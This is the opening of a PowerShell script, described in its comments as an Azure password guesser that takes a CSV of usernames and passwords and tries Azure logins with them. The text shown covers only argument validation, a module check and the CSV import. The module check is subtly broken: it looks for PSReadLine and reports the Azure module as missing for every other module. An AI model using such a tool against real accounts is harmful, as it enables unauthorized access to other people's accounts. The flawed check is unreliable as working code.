# Azure password guesser. Takes in a CSV with a username and password column and makes azure login attempts using the credentials provided
# This is very basic and doesn't take into account evasion tactics 

# Example Usage: > AzurePasswordGuesser.ps1 -path C:\users\public\creds.csv
#Requires -RunAsAdministrator

[cmdLetBinding()]
param(
        [ValidateScript({
            if(-Not ($_ | Test-Path) ){
                throw "File or folder does not exist"
            }
            if(-Not ($_ | Test-Path -PathType Leaf) ){
                throw "The Path argument must be a file. Folder paths are not allowed."
            }
            if($_ -notmatch "(\.csv)"){
                throw "The file specified in the path argument must be a CSV"
            }
            return $true 
        })]
        [System.IO.FileInfo]$path
)

Get-Module | ForEach-Object{
    if($_.Name -eq "PSReadLine"){
        
    }
    else{
        Write-Host -f Red "The Azure PowerShell module is missing. Please install with 'install-module azure'"
    }
}


$creds = Import-Csv $path
